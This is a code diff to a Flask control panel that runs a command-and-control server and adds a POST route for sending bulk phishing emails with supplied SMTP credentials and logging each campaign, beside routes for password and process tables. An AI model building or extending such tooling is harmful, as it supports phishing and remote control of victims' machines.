@@ -2,7 +2,7 @@ from flask import *
 import os
 from Socket.Server import Server
 from .FlskServerTools.user import User
-from .FlskServerTools.Dbactions import LoginDB
+from .FlskServerTools.Dbactions import DBActins
 from flask_login import *
 from secrets import token_urlsafe
 from Tools.toolsF import *
@@ -17,7 +17,7 @@ class FlskSevrev(object):
         )
         self.app.config['SECRET_KEY'] = token_urlsafe(40)
         self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
-        self.dbaction = LoginDB(os.path.join(os.getcwd(),'FlaskAplication','test','SQL','Login.db'))
+        self.dbaction = DBActins(os.path.join(os.getcwd(),'FlaskAplication','test','SQL','Login.db'))
         self.c2Server.start()
         self._ruleResetor()
         self.login_manager = LoginManager()
@@ -118,25 +118,27 @@ class FlskSevrev(object):
             data = request.get_json()
             assert data, "Missing request data."
 
-            required_fields = ['users', 'password', 'from', 'body', 'subject']
+            required_fields = ['FromUserMail','MailPassword','InputToMail','MailSubject','body']
             for i in required_fields:
                 assert i in data, f"Missing required field: {i}"
-
+            subject = data.get('MailSubject')
             response = send_multiple_emails(
-                users=[i.strip() for i in data.get('users', '').split('|')], 
-                password=data.get('password'), 
-                From=data.get('from', ''), 
-                body=data.get('body'),
-                subject=data.get('subject'),
-                port=data.get('port'),
-                files=data.get('files', {}),
-                smtp_server=data.get('smtp_server', 'smtp.gmail.com')
+                users=[i.strip() for i in data['InputToMail'].split('|')], 
+                password=data['MailPassword'],
+                From=data['FromUserMail'], 
+                body=data['body'],
+                subject=subject,
+                port=getJsonKey(data,'port',default=465,check=True),
+                files=getJsonKey(data,'files',default={},check=True),
+                smtp_server=getJsonKey(data,'smtp_server',default='smtp.gmail.com',check=True)
             )
-            return jsonify(response), 200
+            if response.get('status'):
+                return jsonify({"status": "Wrong username or password"}), 401
+            self.dbaction.insert_mail_camp(response=response,subject=subject)
+            return jsonify({}), 200
         except AssertionError as e:
             return jsonify({"error": str(e)}), 400
-        except Exception as e:
-            return jsonify({"error": "An error occurred while sending emails. Please try again."}), 500
+
         
     
     def passwordsTableIndex(self):
@@ -160,3 +162,5 @@ class FlskSevrev(object):
         self.app.add_url_rule('/passwordsTableIndex', 'passwordsTableIndex', login_required(self.passwordsTableIndex))
         self.app.add_url_rule('/ProcessTableIndex', 'ProcessTableIndex', login_required(self.processTableIndex))
         self.app.add_url_rule('/Features/phishing/gettemplates', 'gettemplates', login_required(self.getPhishingTamplets))
+        self.app.add_url_rule('/features/phishing/send_mail', 'send_mail', login_required(self.send_mail), methods=['POST'])
+
